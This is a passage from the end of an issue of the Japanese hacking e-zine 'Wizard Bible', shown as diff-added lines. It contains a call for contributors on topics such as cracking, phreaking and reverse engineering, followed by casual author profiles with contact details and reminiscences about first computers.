+ある人も気軽に声をかけてください（全く気にしていない性格なので）。
+
+　文字数などの規定は特にありませんが、文字数の多いものは、一部編集を加え
+て連載とさせていただく場合があります。
+
+　ただし、頂いた原稿の内容で、コンセプトにそぐわないものに関しては掲載さ
+れない場合や、原稿の一部を変更したものを掲載する場合がありますのでご了承
+ください。
+
+　目標としては、データハウス刊の「危ない28号（現廃刊）」の電脳版といった
+ところです。これについてデータハウスの協力により、発刊の可能性もあります。
+　また、各ジャンルにおいて、有望な方は単行本執筆の可能性もあるそうです。
+
+　奮ってご応募ください。
+
+○取り扱う具体的な分野は次に示すものです。
+・ハッキング（セキュリティネタはこちらに含める）
+・クラッキング（ウイルスやトロイの木馬系も含む）
+・リバースエンジニアリング（シリアル解析、ゲーム改造、オンラインゲームの
+チートを含む）
+・コーディング（純粋なプログラミングネタでもクラッキングに近い内容でもよ
+い）
+・ソーシャルエンジニアリング（開錠技術、侵入技術も含む）
+・暗号
+・フリーキング（一般電話、携帯電話、公衆電話などの話題や電話システムの話）
+・ツール（ツールに特化した話題はこちら）
+・ウェアーズ（共有ソフトやエミュレータはこちらに含める）
+・ウォッチング（サイトや掲示板のウォッチングネタ）
+・ハードクラッキング（自販機、ゲーセンのゲーム機などの怪しい裏技など）
+
+○目標としては、１ヶ月に１回の頻度で発行したいと思っています（予定では毎
+月15日に発行）。
+
+○誤植などのお知らせはIPUSIRON宛て（ipusiron@ruffnex.oc.to）にお願いしま
+す。
+
+○幅広く初心者から上級者までをターゲット層としたいので、執筆陣に参加した
+い方は気軽にメールください。初心者からパワーユーザーまで幅広い層をターゲ
+ットにしたいので、マニアックなネタ、読み物系のネタ、初心者向けのネタなど
+何でも構いません。オリジナルのネタじゃなくても、読みやすく編集・翻訳した
+だけでも十分、一つの記事と言えます。
+　別に『Wizard Bible』でチームを組んでいるわけではないので、他のチームに
+属している人であっても気にする必要は無いと思います。
+
+　グループやチームに関わらず、自分が興味を持った事柄についてのレポートの
+発表の場だと思ってください。
+
+○Wizard Bible（略してWB）の公式サイトは次のURIです。
+
+http://2600ch.com/（一時休止）
+http://akademeia.info/wizardbible/（現在はこちらを使ってください）
+
+　過去の記事を閲覧できるようにしてあります。
+
+○支援者、参加希望者用のスレッドを立てました。
+
+http://ruffnex.oc.to/ipusiron/cgi/forum/patio.cgi?mode=view&no=17
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第８章：著者プロフィール ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■Yousuke Yamamoto
+●Job:DTP/Editor/Writer
+●Web:http://bogus.jp/
+●Mail:yamamoto@bogus.jp
+●Team（Group）:誰か入れてください
+●Comment:
+　はじめまして。山本です。インターネットにつなぎ始めた頃のことを思い出し
+ながら書いてみました。OSの中にはいろいろと役に立つものが入っているようで、
+MacOSXにはCyberkitのようなものが標準で付いてくるんですね。びっくりです。
+●思い出のマシン:Power Macintosh 8100/120
+　初めてウインドウプログラミングを行ったマシンです。
+　貧乏で古い９８（もちろんDOS）を大事に使っていた私が就職して一番初めに与え
+られた仕事がなぜかCodeWarriorを使ったMacの開発（しかも１人）で、ワケのわから
+ないtoolboxをInside Macintoshを片手に、泣きそうになりながらゴリゴリいじって
+いたのが記憶に残っています。
+
+
+■PaiN
+●Job: 学生・バイトプログラマ
+●Web:The Smart CGI Project (http://hex51.darktech.org/)
+●Mail:ss@comeon.to
+●Team（Group）:secret
+●Comment:
+　Webサイトを復活させたかと思いきや日記しか書いていないPaiNです。
+もうじき卒業なので、卒業研究や論文などでかなりごたごたしていて、
+しかも既に毎日会社に出勤しているので正直きついですが、過労死しない程度に
+がんばろうと思います。
+●思い出のマシン:CASIOのZ1-GR
+　ポケコンでもよいということですので、ポケコンとしておきます。正確にはCA
+SIOのZ1-GRという16bit CPUのポケコンです。ポケコンというのはゲームボーイよ
+り少し大きいくらいのコンピュータで、BASIC、C、CASL、ASSEMBLYのコンパイラ
+（いやたぶんインタプリタ）が入っていた（と思う）ので、高校の頃は暇な授業
+中に、これでプログラミングをして遊んでいました。何をプログラミングしてい
+たのかというと工業系数理のテストで出そうな問題を一発で解けるプログラムで
+す。これにでてくる問題は計算が複雑なので計算機を使ってもよいという許可が
+出ていました。そして俺の所属していた機械科では、ポケコンが計算機代わりで
+した。そうです。俺はポケコンで作ったプログラムでテスト問題を解いていまし
+た。そしてなんと機械科の共通テストで、192/200点をとってしまいました。不正
+です。
+
+
+■Kenji Aiko
+●Job: Student
+●Web: http://kenjinet.s26.xrea.com/
+●Mail: kenjinet@s26.xrea.com
+●Team（Group): N/A
+●Comment:
+　「クラッカープログラム大全」を購入しました。読み終わったあとOllyDbgと
+QuickBeを武器にどこぞのシェアウェアソフトを片っ端からＤＬし解析する日々が
+一週間ほど続きました。アセンブラの知識はあったのですがKrack自体はぜんぜん
+知らなかったのでやばいほどハマりました。そして、次のWBは「Krack入門　～シ
+リアルを解析せよ～」にするぜ！　と考えたのですが、さすがおおやけの場でシェ
+アウェアのソフトを解析するわけにもいかないのでボツとなりました。というか
+Krackに関する記事って法律に触れそうでネット上に公開するのはなかなか難しい
+のではないかと思います。そういう意味でもこの本は貴重なものでしょう。
+●思い出のマシン:バーコードバトラー
+　これ→http://www.soi.wide.ad.jp/class/20000010/slides/12/24.htmlです。
+お年玉で買った日のわずか数日後に親父に壊された一品。うちの親父はファミコ
+ンとかゲームとかそういう類（たぐい）のものが嫌いです。かなり嫌いです。も
+う半端じゃありません。世界一ＴＶゲームが嫌いな人間であるといっても過言で
+はありません。ファミコンとか見つけると普通に捨てられます。いやマジです。
+「あれ？おかしいなぁ。スーファミどこいった？」という場合はたいてい「家の
+近くのゴミ捨て場」にあります。いやマジなんですよ。ホントなんですよ。よく
+兄が拾いに行ってました（兄はゲーム好きです）。しかしたいてい破損しており
+ます。直せるばあいと直せないばあいがあります。直せないばあいは「御臨終で
+す」ということで再びゴミ捨て場に舞い戻ります。バーコードバトラーはＴＶゲ
+ームに入るかどうか微妙なところだったのですが、どうやら入ってしまったよう
+でした。「そんな親がいるかよ！」とつっこまれるかもしれませんが、本当なん
+です。いるんですよ。かなりの頑固親父です。こんな親のもとで育った兄弟です
+がゲーム機を隠して「わからなければＯＫ」という兄と、正直に親のいうことを
+聞いて買わない私。それは歳をとった現在でもその「生き方」に対照的な違いが
+あることは言うまでもない。そんな私が自腹で買ってしまった最初で最後のゲー
+ム機、それが「バーコードバトラー」です。思い出深い一品ですね。
+
+【編注】私もバーコードバトラー持ってました（笑）。日本製品のバーコードで
+はなく外国製品のバーコードの方が強いキャラが出やすかったような気がします。
+
+
+■Defolos
+●Job:Student
+●Web:none
+●Mail:pan1124@luck.ocn.ne.jp
+●Team（Group）:none
+●Comment:
+　こんにちは、Wizard Bibleへの参加は2回目になるDefolosです。
+今回もぎりぎりになって迷惑かけてしまいました。どうもこれでは「学習しない
+奴」ですね(^^;)
+　ごく普通の学生で趣味はピッキングとナイフメーキングとナイフファイティン
+グの訓練、PCいじりです。自分の趣味を語るとみんな変な顔しますが、いろんな
+趣味のひとがいてもいいですよね。
+　というわけで今後もよろしくお願いします。
+●思い出のマシン
+　「思い出のマシン」ですが、そんなに思い出とかいうほど人生を生きたわけで
+はないのでけど、強いて言えば高校に入学したとき買ってもらったPCでしょうか
+（思い出って、まだ壊れたわけでないですよ）。
+　これと言ったエピソードもありませんが、尊敬する親戚に作ってもらったもの
+で、PCに興味を持つききかけとなりました。
+
+
+■D
+●Job:SE
+●Web:SEの小箱（http://iron_beasty.tripod.co.jp/）
+●Mail:death_beasty@hotmail.com
+●Team（Group）:N/A
+●Comment:
+　新参者のＤです。
+　様々な会社のネットワークの危ない部分を指摘したいと思っています。趣味は
+ヘヴィ・メタルを腹のそこから歌うこと。
+　まだまだ勉強が足りないところがあると思いますが、優しい目で見守ってくだ
+さい。
+●思い出のマシン:ＮＥＣ　ＰＣ９８２１－ＸＳ
+　このマシンを手に入れたおかげＰＣがないと生きていけない体になってしまい
+ました。　やってたことと言えば、Ｃ言語とゲームだけなんですがね。
+　今思えばＩ４８６マシンだったからＰｅｎｔｉｕｍオーバドライブを載せて置
+けばよかったと後悔しています。　そうすればもっと快適にエ○ゲーができたん
+だろうなぁ。
+
+
+■MaD
+●Job:DATA HOUSE
+●Web:http://www.data-house.co.jp/
+●Mail:mad@data-house.co.jp
+●Team（Group）:secret
+●Comment:
+　元ハカージャパソと危ない28号の百円ライター。趣味は、空き缶拾いと牛乳瓶
+のフタ集め。２ちゃんねるでは「矢崎マサユキ」、「白鶴・丸」、「大同曲芸人
+」、「泥棒・詐欺師」として通っている。ウソばかりつくので友達はいない。
+　現在は会社でヒッキーをしているが、将来はネットカフェの店員なるという目
+標に向かってまっしぐら。とぁっ！(`Д´)。
+
+
+■IPUSIRON
+●Job:サイト更新
+●Web:- Security Akademeia -（http://akademeia.info/）
+●Mail:ipusiron@ruffnex.oc.to
+●Team（Group）:TeamSA
+●Comment:
+　リネ2始めました。サーバー4にいるので、気軽に声かけてください。キャラ名
+はそのまま「IPUSIRON」です。
+●思い出のマシン:NEC PC-8801MC
+　なんとCD-ROMドライブ内蔵のPC88です。中学校1年のときに小遣いをためて購入
+したんですが、PC88はすでに終焉の時期。そんなこととは露知らず購入しちゃい
+ました。結局1年後にはPC9801BXを購入しました。でも、FDD内蔵のPCを触れるの
+は初めてだったので今ではいい思い出です。それ以前はMSXしかいじったことがあ
+りませんでした。
+
